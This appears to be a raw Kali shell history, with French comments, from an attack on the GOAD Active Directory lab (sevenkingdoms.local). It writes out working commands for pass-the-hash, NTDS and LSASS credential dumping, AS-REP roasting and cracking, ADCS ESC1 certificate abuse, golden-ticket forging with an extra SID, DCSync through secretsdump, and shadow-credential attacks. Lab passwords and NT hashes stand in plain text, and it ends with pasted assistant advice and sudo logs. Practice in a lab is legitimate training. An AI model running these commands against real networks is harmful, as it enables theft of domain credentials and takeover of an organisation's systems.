+nxc smb 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --ntds
+nxc smb 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -M ntdsutil
+nxc smb 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --ntds --user krbtgt
+nxc smb 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --lsass
+nxc smb 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -M lsass
+nxc smb 192.168.56.11 -u 'Administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' -M lsassy
+cp ~/Desktop/GOAD/certipy01.txt /mnt/hgfs/fichierpartageKali/
+sudo sh -c "echo '192.168.56.10 kingslanding.sevenkingdoms.local sevenkingdoms.local' >> /etc/hosts"
+history > commandes_goad.txt
+lq
+ls
+unzip 20260430101834_bloodhound.zip
+ls
+cat 20260430101834_users.json
+ls
+cp ~/Desktop/GOAD/commandes_goad.txt /mnt/hgfs/fichierpartageKali/
+sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other\
+ls /mnt/hgfs/
+sudo mkdir -p /mnt/hgfs\
+sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other\
+ls /mnt/hgfs/
+ls
+cd Desktop
+ls
+cd GOAD
+ls
+pwd
+cp ~/Desktop/GOAD/recon.txt /mnt/hgfs/fichierpartageKali/
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22 -u guest -p ""
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22 -v
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22 -u guest -p ""
+netexec ldap 192.168.56.10 192.168.56.11 -u '' -p ''
+netexec mssql 192.168.56.22 -u sa -p sa
+netexec mssql 192.168.56.22 -u sa -p ""
+netexec mssql 192.168.56.22 -u sa -p "Password1"
+dig axfr @192.168.56.10 sevenkingdoms.local\
+dig axfr @192.168.56.11 north.sevenkingdoms.local
+rpcclient -U "" -N 192.168.56.10 -c "enumdomusers"\
+rpcclient -U "" -N 192.168.56.11 -c "enumdomusers"
+whatweb http://192.168.56.10\
+whatweb http://192.168.56.22
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22 -u '' -p '' --shares
+ls
+cp ~/Desktop/GOAD/recon02.txt /mnt/hgfs/fichierpartageKali/
+sudo apt install seclists -y
+ldapsearch -x -H ldap://192.168.56.10 -b "DC=sevenkingdoms,DC=local" "(objectClass=user)" sAMAccountName 2>/dev/null | grep sAMAccountName | awk '{print $2}' >> ~/Desktop/GOAD/users_all.txt
+ldapsearch -x -H ldap://192.168.56.11 -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=user)" sAMAccountName 2>/dev/null | grep sAMAccountName | awk '{print $2}' >> ~/Desktop/GOAD/users_all01.txt
+ls
+sort -u ~/Desktop/GOAD/users_all.txt -o ~/Desktop/GOAD/users_all02.txt
+ls
+cat ~/Desktop/GOAD/users_all.txt
+cat ~/Desktop/GOAD/users_all01.txt
+cat ~/Desktop/GOAD/users_all02.txt
+cat ~/Desktop/GOAD/users_north.txt
+rpcclient -U "" -N 192.168.56.11 -c "enumdomusers" 2>/dev/null | tee ~/Desktop/GOAD/users_raw.txt
+cat ~/Desktop/GOAD/users_raw.txt | grep -oP '(?<=\[)[^\]]+(?=\])' | grep -v '0x' > ~/Desktop/GOAD/users_north.txt\
+cat ~/Desktop/GOAD/users_north.txt
+sed -i 's/\. /./g' ~/Desktop/GOAD/users_north.txt\
+# Supprime Guest (pas utile)\
+sed -i '/^Guest$/d' ~/Desktop/GOAD/users_north.txt\
+cat ~/Desktop/GOAD/users_north.txt
+sed -i 's/ \././g' ~/Desktop/GOAD/users_north.txt\
+cat ~/Desktop/GOAD/users_north.txt
+impacket-GetNPUsers -request \\
+-outputfile ~/Desktop/GOAD/hashes.asrep \\
+-format john \\
+-usersfile ~/Desktop/GOAD/users_north.txt \\
+-dc-ip 192.168.56.11 \\
+north.sevenkingdoms.local/
+john ~/Desktop/GOAD/hashes.asrep \\
+--wordlist=/usr/share/wordlists/rockyou.txt
+cp ~/Desktop/GOAD/enum.txt /mnt/hgfs/fichierpartageKali/
+netexec smb 192.168.56.11 -u brandon.stark -p iseedeadpeople
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22 -u brandon.stark -p iseedeadpeople --shares
+smbclient //192.168.56.11/SYSVOL \\
+-U "north.sevenkingdoms.local/brandon.stark%iseedeadpeople" \\
+-c "ls"
+smbclient //192.168.56.11/SYSVOL \\
+-U "north.sevenkingdoms.local/brandon.stark%iseedeadpeople" \\
+-c "recurse ON; ls"
+cp ~/Desktop/GOAD/smbclient.txt /mnt/hgfs/fichierpartageKali/
+smbclient //192.168.56.11/SYSVOL \\
+-U "north.sevenkingdoms.local/brandon.stark%iseedeadpeople" \\
+-c "get north.sevenkingdoms.local\scripts\script.ps1; get north.sevenkingdoms.local\scripts\secret.ps1"\
+\
+cat script.ps1\
+cat secret.ps1
+find ~/ -name "script.ps1" 2>/dev/null\
+find ~/ -name "secret.ps1" 2>/dev/null
+smbclient //192.168.56.11/SYSVOL \\
+-U "north.sevenkingdoms.local/brandon.stark%iseedeadpeople" \\
+-c "get north.sevenkingdoms.local\scripts\script.ps1; get north.sevenkingdoms.local\scripts\secret.ps1"\
+\
+
+ls
+cat ~/Desktop/GOAD/north.sevenkingdoms.local/scripts/script.ps1\
+cat ~/Desktop/GOAD/north.sevenkingdoms.local/scripts/secret.ps1
+find ~/Desktop/GOAD/ -name "*.ps1" 2>/dev/null\
+ls -la ~/Desktop/GOAD/
+cat ~/Desktop/GOAD/'north.sevenkingdoms.local\scripts\script.ps1'\
+cat ~/Desktop/GOAD/'north.sevenkingdoms.local\scripts\secret.ps1'
+nano fichierPS1.txt
+cp ~/Desktop/GOAD/fichierPS1.txt /mnt/hgfs/fichierpartageKali/
+netexec smb 192.168.56.10 192.168.56.11 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_'
+netexec winrm 192.168.56.11 192.168.56.22 \\
+-u jeor.mormont -p '_L0ngCl@w_'
+evil-winrm -i 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_'
+ip a
+sudo nmap -T5 -sS -sV -O 192.168.56.0/24
+# Corriger /etc/hosts\
+sudo sh -c "echo '192.168.56.10 kingslanding.sevenkingdoms.local sevenkingdoms.local' >> /etc/hosts"\
+\
+# Tenter avec jeor.mormont (north) â€ƒ´ certipy via trust\
+certipy req \\
+-u 'jeor.mormont@north.sevenkingdoms.local' \\
+-hashes ':6dccf1c567c56a40e56691a723a49664' \\
+-target kingslanding.sevenkingdoms.local \\
+-ca SEVENKINGDOMS-CA \\
+-template ESC1 \\
+-upn administrator@sevenkingdoms.local \\
+-dc-ip 192.168.56.10
+evil-winrm -i 192.168.56.11 \\
+-u Administrator \\
+-H dbd13e1c4e338284ac4e9874f7de6ef4
+# Sur Kali â€ƒ´ copie Certify.exe avec un autre nom\
+cp ~/Desktop/GOAD/Certify.exe ~/Desktop/GOAD/cert.exe\
+\
+# Reconnecte evil-winrm\
+evil-winrm -i 192.168.56.11 \\
+-u Administrator \\
+-H dbd13e1c4e338284ac4e9874f7de6ef4
+netexec smb 192.168.56.10 \\
+-u tyron.lannister \\
+-p 'powerkingftw135' \\
+-d sevenkingdoms.local
+# Test avec diffÃ©rentes orthographes\
+netexec smb 192.168.56.10 \\
+-u tyrion.lannister \\
+-p 'powerkingftw135' \\
+-d sevenkingdoms.local\
+\
+netexec smb 192.168.56.10 \\
+-u tyron.lannister \\
+-p 'powerkingftw135' \\
+-d sevenkingdoms.local --local-auth
+certipy req \\
+-u 'tyron.lannister@sevenkingdoms.local' \\
+-p 'powerkingftw135' \\
+-target kingslanding.sevenkingdoms.local \\
+-ca SEVENKINGDOMS-CA \\
+-template ESC1 \\
+-upn administrator@sevenkingdoms.local \\
+-dc-ip 192.168.56.10
+cat > /tmp/users_seven.txt << 'EOF'\
+Administrator\
+tywin.lannister\
+jaime.lannister\
+cersei.lannister\
+tyron.lannister\
+robert.baratheon\
+joffrey.baratheon\
+renly.baratheon\
+stannis.baratheon\
+petyer.baelish\
+lord.varys\
+maester.pycelle\
+EOF\
+\
+netexec smb 192.168.56.10 \\
+-u /tmp/users_seven.txt \\
+-p 'powerkingftw135' \\
+-d sevenkingdoms.local \\
+--continue-on-success
+certipy req \\
+-u 'tywin.lannister@sevenkingdoms.local' \\
+-p 'powerkingftw135' \\
+-target kingslanding.sevenkingdoms.local \\
+-ca SEVENKINGDOMS-CA \\
+-template ESC1 \\
+-upn administrator@sevenkingdoms.local \\
+-dc-ip 192.168.56.10
+# VÃ©rifier ce qu'il y a dÃ©jÃƒ€\
+cat /etc/hosts | grep -i kingsland\
+\
+# Si vide ou incorrect, Ã©craser proprement\
+sudo sh -c "echo '192.168.56.10 kingslanding.sevenkingdoms.local sevenkingdoms.local' >> /etc/hosts"\
+\
+# Test rÃ©solution\
+ping -c 2 kingslanding.sevenkingdoms.local
+certipy req \\
+-u 'tywin.lannister@sevenkingdoms.local' \\
+-p 'powerkingftw135' \\
+-target kingslanding.sevenkingdoms.local \\
+-ca SEVENKINGDOMS-CA \\
+-template ESC1 \\
+-upn administrator@sevenkingdoms.local \\
+-dc-ip 192.168.56.10 \\
+-ns 192.168.56.10 \\
+-dns-tcp
+# Nettoyer /etc/hosts (tu as 3 lignes en doublon)\
+sudo sed -i '/kingslanding/d' /etc/hosts\
+sudo sed -i '/sevenkingdoms/d' /etc/hosts\
+sudo sh -c "echo '192.168.56.10 kingslanding.sevenkingdoms.local sevenkingdoms.local kingslanding' >> /etc/hosts"\
+\
+# VÃ©rifier\
+cat /etc/hosts | grep -i king
+certipy req \\
+-u 'tywin.lannister@sevenkingdoms.local' \\
+-p 'powerkingftw135' \\
+-target 192.168.56.10 \\
+-ca SEVENKINGDOMS-CA \\
+-template ESC1 \\
+-upn administrator@sevenkingdoms.local \\
+-dc-ip 192.168.56.10
+nc -zv 192.168.56.10 135
+nc -zv 192.168.56.10 445
+ping -c 2 192.168.56.10
+ip a show tun0
+# DÃ©marrer Neo4j\
+sudo neo4j start\
+\
+# VÃ©rifier qu'il tourne\
+sudo neo4j status\
+\
+# Lancer BloodHound\
+bloodhound &
+# Test connectivitÃ©\
+nc -zv 192.168.56.10 445\
+nc -zv 192.168.56.10 135\
+\
+# Si les ports rÃ©pondent, relance certipy directement\
+certipy req \\
+-u 'tywin.lannister@sevenkingdoms.local' \\
+-p 'powerkingftw135' \\
+-target 192.168.56.10 \\
+-ca SEVENKINGDOMS-CA \\
+-template ESC1 \\
+-upn administrator@sevenkingdoms.local \\
+-dc-ip 192.168.56.10
+nc -zv 192.168.56.10 445\
+nc -zv 192.168.56.10 135
+nc -zv 192.168.56.11 445\
+nc -zv 192.168.56.22 445\
+nc -zv 192.168.56.10 80\
+nc -zv 192.168.56.10 88\
+nc -zv 192.168.56.10 389
+# Test si Kingslanding est joignable depuis Kali (refresh)\
+nc -zv 192.168.56.10 445\
+\
+# Si OK â€ƒ´ utiliser tywin pour Ã©numÃ©rer\
+netexec ldap 192.168.56.10 \\
+-u tywin.lannister \\
+-p 'powerkingftw135' \\
+-d sevenkingdoms.local \\
+--users
+nc -zv 192.168.56.10 445
+certipy req \\
+-u 'tywin.lannister@sevenkingdoms.local' \\
+-p 'powerkingftw135' \\
+-target 192.168.56.10 \\
+-ca SEVENKINGDOMS-CA \\
+-template ESC1 \\
+-upn administrator@sevenkingdoms.local \\
+-dc-ip 192.168.56.10
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+nmap -T4 -p 53,80,88,135,389,445,464,593,636,3268,3269,3389,5985 192.168.56.10 --open
+# Voir le statut VPN actuel\
+nmcli connection show --active\
+\
+# Trouver le nom de ta connexion VPN\
+nmcli connection show | grep -i vpn\
+\
+# Voir ton IP tun0 actuelle\
+ip a show tun0 | grep "inet "
+# DÃ©connecter le VPN GOAD (l'ancien)\
+nmcli connection down GOAD\
+\
+# VÃ©rifier qu'il ne reste que GOADEVAL\
+nmcli connection show --active\
+\
+# Voir l'IP tun0\
+ip a show tun0 | grep "inet "\
+\
+# Test KINGSLANDING\
+nc -zv 192.168.56.10 445
+[200~netexec ldap 192.168.56.10 \\
+-u Administrator \\
+-H dbd13e1c4e338284ac4e9874f7de6ef4 \\
+-d north.sevenkingdoms.local \ 
+netexec ldap 192.168.56.10 \\
+-u Administrator \\
+-H dbd13e1c4e338284ac4e9874f7de6ef4 \\
+-d north.sevenkingdoms.local \\
+-M get_sid_domain
+impacket-lookupsid \\
+'north.sevenkingdoms.local/Administrator@192.168.56.10' \\
+-hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' \\
+0
+impacket-ticketer \\
+-nthash 68a0a74138bd5c949d528437c0c371d1 \\
+-domain-sid S-1-5-21-2441412631-2227122138-1520181883 \\
+-domain north.sevenkingdoms.local \\
+-extra-sid S-1-5-21-3237389679-363996874-134484376-519 \\
+-spn krbtgt/sevenkingdoms.local \\
+Administrator
+export KRB5CCNAME=Administrator.ccache\
+\
+# Test accÃ¨s SMB\
+netexec smb 192.168.56.10 \\
+-u Administrator \\
+-k --no-pass \\
+-d sevenkingdoms.local
+netexec smb 192.168.56.10 \\
+-u Administrator \\
+-k \\
+-d sevenkingdoms.local
+sudo ntpdate 192.168.56.10
+sudo rdate -n 192.168.56.10
+sudo date -s "$(netexec smb 192.168.56.10 2>&1 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')"
+netexec smb kingslanding.sevenkingdoms.local \\
+-u Administrator \\
+-k \\
+-d sevenkingdoms.local
+impacket-secretsdump \\
+-k -no-pass \\
+-dc-ip 192.168.56.10 \\
+sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
+impacket-secretsdump \\
+-k -no-pass \\
+-dc-ip 192.168.56.10 \\
+-just-dc-user krbtgt \\
+sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
+impacket-secretsdump \\
+-k -no-pass \\
+-dc-ip 192.168.56.10 \\
+-just-dc-user Administrator \\
+sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
+netexec smb 192.168.56.11 \\
+-u Administrator \\
+-H dbd13e1c4e338284ac4e9874f7de6ef4 \\
+--ntds \\
+--user krbtgt
+impacket-secretsdump \\
+-hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' \\
+-just-dc-user krbtgt \\
+north.sevenkingdoms.local/Administrator@192.168.56.11
+impacket-secretsdump \\
+-hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' \\
+-just-dc-user 'NORTH/krbtgt' \\
+north.sevenkingdoms.local/Administrator@192.168.56.11
+impacket-ticketer \\
+-nthash fd1ac4ba3a9a9f0d2f3784e12b5fc91d \\
+-aesKey 822fca84a2297009a909030a6458b77218feb98478af94b0eb1da3aa05f6e0be \\
+-domain-sid S-1-5-21-2441412631-2227122138-1520181883 \\
+-domain north.sevenkingdoms.local \\
+-extra-sid S-1-5-21-3237389679-363996874-134484376-519 \\
+-spn krbtgt/sevenkingdoms.local \\
+Administrator
+impacket-ticketer \\
+-aesKey 822fca84a2297009a909030a6458b77218feb98478af94b0eb1da3aa05f6e0be \\
+-domain-sid S-1-5-21-2441412631-2227122138-1520181883 \\
+-domain north.sevenkingdoms.local \\
+-extra-sid S-1-5-21-3237389679-363996874-134484376-519 \\
+-spn krbtgt/sevenkingdoms.local \\
+Administrator
+export KRB5CCNAME=Administrator.ccache\
+\
+impacket-secretsdump \\
+-k -no-pass \\
+-dc-ip 192.168.56.10 \\
+-just-dc-user Administrator \\
+sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
+impacket-ticketer \\
+-nthash 53b0cb49ad4b98d11ab6eb158a895c17 \\
+-domain-sid S-1-5-21-2441412631-2227122138-1520181883 \\
+-domain north.sevenkingdoms.local \\
+-extra-sid S-1-5-21-3237389679-363996874-134484376-519 \\
+-spn krbtgt/sevenkingdoms.local \\
+Administrator\
+
+export KRB5CCNAME=Administrator.ccache\
+\
+impacket-secretsdump \\
+-k -no-pass \\
+-dc-ip 192.168.56.10 \\
+-just-dc-user Administrator \\
+sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
+unset KRB5CCNAME\
+rm Administrator.ccache\
+\
+# Tente DCSync direct avec NTLM\
+impacket-secretsdump \\
+-hashes ':dbd13e1c4e338284ac4e9874f7de6ef4' \\
+-just-dc-user Administrator \\
+'sevenkingdoms.local/Administrator@192.168.56.10'
+netexec ldap 192.168.56.10 \\
+-u Administrator \\
+-H dbd13e1c4e338284ac4e9874f7de6ef4 \\
+-d north.sevenkingdoms.local \\
+--users
+impacket-GetUserSPNs -request \\
+-target-domain sevenkingdoms.local \\
+-dc-ip 192.168.56.10 \\
+-outputfile hashes_seven.kerberoast \\
+north.sevenkingdoms.local/jeor.mormont:_L0ngCl@w_
+cat > /tmp/users_seven.txt << 'EOF'\
+tywin.lannister\
+jaime.lannister\
+cersei.lannister\
+tyron.lannister\
+robert.baratheon\
+joffrey.baratheon\
+renly.baratheon\
+stannis.baratheon\
+petyer.baelish\
+lord.varys\
+maester.pycelle\
+EOF\
+\
+impacket-GetNPUsers -request \\
+-outputfile hashes_seven.asrep \\
+-format john \\
+-usersfile /tmp/users_seven.txt \\
+-dc-ip 192.168.56.10 \\
+sevenkingdoms.local/
+evil-winrm -i 192.168.56.22 \\
+-u jeor.mormont -p '_L0ngCl@w_'
+bloodhound
+# Lance le setup s'il n'est pas fait\
+sudo bloodhound-setup\
+\
+# Une fois setup terminÃ©, dÃ©marrer BloodHound\
+sudo bloodhound-cli start\
+\
+# VÃ©rifier le statut\
+sudo bloodhound-cli status
+# VÃ©rifier si bloodhound-legacy existe\
+which bloodhound-legacy\
+\
+# Si oui, l'utiliser\
+bloodhound-legacy\
+\
+# Sinon, installer la version Java legacy\
+sudo apt install bloodhound -y
+# Scan rapide des ports principaux\
+nmap -p 53,80,88,389,443,464,636,3268,3389,5985,5986 192.168.56.10 -T4 --open
+# MÃ©thode docker compose officielle\
+mkdir -p ~/bloodhound && cd ~/bloodhound\
+\
+curl -L https://ghst.ly/getbhce -o docker-compose.yml\
+\
+sudo docker compose pull\
+sudo docker compose up -d
+sudo docker compose logs bloodhound | grep -i "initial password"
+# Installer docker compose plugin\
+sudo apt update\
+sudo apt install docker-compose-v2 -y\
+\
+# VÃ©rifier\
+docker compose version
+sudo apt install docker-compose -y
+cd ~\
+git clone https://github.com/SpecterOps/BloodHound.git\
+cd BloodHound/examples/docker-compose\
+\
+# Lancer avec docker-compose (vieille syntaxe)\
+sudo docker-compose pull\
+sudo docker-compose up -d
+sudo docker-compose logs bloodhound | grep -i "initial password"
+# Cherche Certify.exe partout sur le systÃ¨me\
+find / -iname "Certify.exe" 2>/dev/null\
+\
+# VÃ©rifie aussi les emplacements classiques\
+ls -la ~/Desktop/GOAD/\
+ls -la /usr/share/windows-resources/ 2>/dev/null | grep -i certify\
+ls -la /opt/ 2>/dev/null | grep -i certify\
+\
+# VÃ©rifie si dÃ©jÃƒ€ sur WINTERFELL\
+# (Ãƒ€ lancer dans evil-winrm)\
+# ls C:\Windows\Temp\\
+# ls C:\Users\administrator\Documents\ 
+find / -iname "Certify.exe" 2>/dev/null
+ls -la ~/Desktop/GOAD/\
+ls -la /usr/share/windows-resources/ 2>/dev/null | grep -i certify\
+ls -la /opt/ 2>/dev/null | grep -i certify
+ping -c 2 8.8.8.8
+[200~wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe -O ~/Desktop/GOAD/Certify.exe
+# VÃ©rifier la taille (~330 Ko attendu)
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe -O ~/Desktop/GOAD/Certify.exe
+ls -la ~/Desktop/GOAD/Certify.exe
+nc -zv 192.168.56.10 445
+evil-winrm -i 192.168.56.11 -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4
+evil-winrm -i 192.168.56.11 -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4
+impacket-GetUserSPNs -request-user joffrey.baratheon \\
+-dc-ip 192.168.56.10 \\
+-outputfile ~/Desktop/GOAD/joffrey.kerberoast \\
+sevenkingdoms.local/jaime.lannister:'Jaime123!'
+# VÃ©rifier que le fichier est bien lÃƒ€\
+ls -la ~/Desktop/GOAD/tgs_joffrey.b64\
+wc -c ~/Desktop/GOAD/tgs_joffrey.b64\
+\
+# DÃ©coder le base64 en binaire\
+base64 -d ~/Desktop/GOAD/tgs_joffrey.b64 > ~/Desktop/GOAD/tgs_joffrey.bin\
+ls -la ~/Desktop/GOAD/tgs_joffrey.bin\
+\
+# Voir la structure ASN.1\
+file ~/Desktop/GOAD/tgs_joffrey.bin\
+xxd ~/Desktop/GOAD/tgs_joffrey.bin | head -20
+sudo nmap -T5 -sS -sV -O 192.168.56.0/24
+ping 192.168.56.10
+sudo nmap -T5 -sS -sV -O 192.168.56.0/24
+cd ~/Desktop/GOAD\
+\
+bloodhound-python -u 'tywin.lannister' -p 'powerkingftw135' \\
+-d sevenkingdoms.local \\
+-dc kingslanding.sevenkingdoms.local \\
+-ns 192.168.56.10 \\
+-c All --zip
+for p in 53 80 88 135 139 389 445 464 593 636 3268 3389 5985; do\
+  echo -n "Port $p: "\
+  timeout 2 nc -zv 192.168.56.10 $p 2>&1 | grep -oE "open|refused|timeout|succeeded" | head -1\
+done
+ping -c 3 192.168.56.10
+# Lister tes ovpn dispos\
+ls ~/*.ovpn ~/Desktop/*.ovpn 2>/dev/null\
+\
+# Voir IP actuelle\
+ip a show tun0 | grep "inet "
+nmcli connection down GOADEVAL\
+sleep 5\
+nmcli connection up GOADEVAL\
+sleep 5\
+ip a show tun0 | grep "inet "\
+nc -zv 192.168.56.10 445
+nc -zv 192.168.56.10 445
+certipy shadow auto \\
+-u jaime.lannister@sevenkingdoms.local \\
+-p 'Jaime123!' \\
+-account 'joffrey.baratheon' \\
+-dc-ip 192.168.56.11
+targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p Jaime123! --request-user joffrey.baratheon
+ls
+cd ..
+ls
+cd targetedKerberoast/
+targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p Jaime123! --request-user joffrey.baratheon
+ls
+python3 targetedKerberoast.py -v \\
+-d sevenkingdoms.local \\
+-u jaime.lannister \\
+-p 'Jaime123!' \\
+--request-user joffrey.baratheon \\
+--dc-ip 192.168.56.11
+python3 targetedKerberoast.py -v \\
+-d sevenkingdoms.local \\
+-u jaime.lannister \\
+-p 'Jaime123!' \\
+--request-user joffrey.baratheon \\
+--dc-ip 192.168.56.11 \\
+--dc-host winterfell.north.sevenkingdoms.local
+certipy shadow auto \\
+-u jaime.lannister@sevenkingdoms.local \\
+-p 'Jaime123!' \\
+-account 'joffrey.baratheon' \\
+-dc-ip 192.168.56.11
+evil-winrm -i 192.168.56.11 \\
+-u Administrator \\
+-H dbd13e1c4e338284ac4e9874f7de6ef4
+certipy find \\
+-u tywin.lannister@sevenkingdoms.local \\
+-p powerkingftw135 \\
+-dc-ip 192.168.56.11 \\
+-stdout -text
+ls 
+cd Documents
+ls
+nano test.txt
+\
+cp test.txt /mnt/smb/Users/WavyCorp/Documents/fichierpartageKali/
+certipy req \\
+-ca SEVENKINGDOMS-CA \\
+-u tywin.lannister@sevenkingdoms.local \\
+-p powerkingftw135 \\
+-template ESC1 \\
+-upn administrator@sevenkingdoms.local \\
+-sid S-1-5-21-3237389679-363996874-134484376-500 \\
+-target 192.168.56.10 \\
+-dc-ip 192.168.56.11
+xfreerdp /v:192.168.56.11 u:brandon.stark p:iseedeadpeople d:north.sevenkingdoms.local
+xfreerdp /v:192.168.56.11 /u:brandon.stark /p:iseedeadpeople /d:north.sevenkingdoms.local
+y
+exir
+evil-winrm -i 192.168.56.11 -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4
+certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'pasdebraspasdechocolat' -account 'joffrey.baratheon'
+certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'Jaime123!' -account 'joffrey.baratheon'
+certipy shadow auto \\
+-u jaime.lannister@sevenkingdoms.local \\
+-p 'Jaime123!' \\
+-account 'joffrey.baratheon' \\
+-dc-ip 192.168.56.10 \\
+-ns 192.168.56.11 \\
+-dns-tcp
+certipy shadow auto -u joffrey.baratheon@sevenkingdoms.local -p '1killerlion' -account 'tyron.lannister'
+netexec smb 192.168.56.11 \\
+-u tyron.lannister \\
+-p 'Alc00L&S3x' \\
+-d sevenkingdoms.local
+netexec smb 192.168.56.11 -u joffrey.barathron -p '1killerlion' -d sevenkingdoms.local
+# TÃ©lÃ©charge depuis Kali (VPN coupÃ©)\
+git clone https://github.com/ShutdownRepo/targetedKerberoast.git\
+cd targetedKerberoast\
+\
+# Relance VPN puis :\
+python3 targetedKerberoast.py -v \\
+-d sevenkingdoms.local \\
+-u jaime.lannister \\
+-p 'Jaime123!' \\
+--request-user joffrey.baratheon \\
+--dc-ip 192.168.56.10
+git clone https://github.com/ShutdownRepo/targetedKerberoast.git\
+cd targetedKerberoast
+python3 targetedKerberoast.py -v \\
+-d sevenkingdoms.local \\
+-u jaime.lannister \\
+-p 'Jaime123!' \\
+--request-user joffrey.baratheon \\
+--dc-ip 192.168.56.10
+python3 targetedKerberoast.py -v \\
+-d sevenkingdoms.local \\
+-u jaime.lannister \\
+-p 'Jaime123!' \\
+--request-user joffrey.baratheon \\
+--dc-ip 192.168.56.11
+impacket-GetuserSPNs North.sevenkingdms.local/samwel.tarly:heartsbane -dc-ip 192.168.56.11 -request
+impacket-GetUserSPNs North.sevenkingdms.local/samwel.tarly:heartsbane -dc-ip 192.168.56.11 -request
+impacket-GetUserSPNs North.sevenkingdms.local/samwel.tarly:heartsbane -dc-ip 192.168.56.10 -request
+impacket-GetUserSPNs North.sevenkingdms.local/samwel.tarly:heartsbane -dc-ip 192.168.56.22 -request
+crackmapexec smb winterfell -u users.txt -p passwords.txt --continue-on-success
+cd ..
+ls
+evil-winrm -i 192.168.56.11 -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4
+history > Allcommand.txt
+ls
+cat Allcommand.txt
+sudo grep "COMMAND=" /var/log/auth.log > logs_root.txt
+history -a  # Pour Bash\
+    fc -W       # Pour Zsh\
+    ```\
+\
+### 3. Les logs des outils spÃ©cifiques\
+Si tu utilises des outils comme **Metasploit**, **Airodump-ng** ou **Sqlmap**, leurs commandes internes ne s'affichent pas dans l'historique de Kali.\
+*   **Exemple Metasploit :** Il faut regarder dans `~/.msf4/history`.\
+*   **Exemple Python :** Si tu as codÃ© en interactif, c'est dans `~/.python_history`.\
+\
+---\
+\
+### La commande "Ultime" pour tout regrouper\
+Si tu veux crÃ©er un fichier qui contient Ãƒ€ la fois ton historique et les logs de sÃ©curitÃ© (sudo), utilise ceci :\
+\
+```bash\
+{ \
+  echo "--- HISTORIQUE SHELL ---"; cat ~/.zsh_history; \
+  echo -e "\n--- LOGS SUDO/AUTH ---"; sudo grep "COMMAND=" /var/log/auth.log; \
+} > diagnostic_complet.txt
+
+--- LOGS D'EXECUTION (SUDO) ---
+Dec 21 13:48:38 kali sudo[4084]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/dpkg-reconfigure keyboard-configuration
+Dec 21 13:48:38 kali sudo[4084]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 21 13:51:37 kali sudo[4084]: pam_unix(sudo:session): session closed for user root
+Dec 21 13:51:44 kali sudo[5958]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/sbin/dpkg-reconfigure keyboard-configuration
+Dec 21 13:51:44 kali sudo[5958]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 21 13:51:57 kali sudo[5958]: pam_unix(sudo:session): session closed for user root
+-- Boot c0073dee8ec14e9c995b9857eb3b8fa1 --
+Dec 21 13:57:41 kali sudo[4191]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop ; USER=root ; COMMAND=/usr/bin/host Alpha
+Dec 21 13:57:41 kali sudo[4191]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 21 13:57:48 kali sudo[4191]: pam_unix(sudo:session): session closed for user root
+Dec 21 13:58:03 kali sudo[4422]:     kali : TTY=pts/0 ; PWD=/home/kali/Desktop ; USER=root ; COMMAND=/usr/bin/hostname alpha
+Dec 21 13:58:03 kali sudo[4422]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 21 13:58:03 alpha sudo[4422]: pam_unix(sudo:session): session closed for user root
+Dec 21 14:00:14 alpha sudo[5365]:     kali : unable to resolve host alpha: Name or service not known
+Dec 21 14:00:14 alpha sudo[5365]: pam_unix(sudo:auth): conversation failed
+Dec 21 14:00:14 alpha sudo[5365]: pam_unix(sudo:auth): auth could not identify password for [kali]
+-- Boot 4fe4ecaa97344dcf89a9e68bdbfef1dc --
+Dec 21 15:37:33 kali sudo[1913]:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/apt update
+Dec 21 15:37:33 kali sudo[1913]: pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)
+Dec 21 15:38:01 kali sudo[1913]: pam_unix(sudo:session): session closed for user root
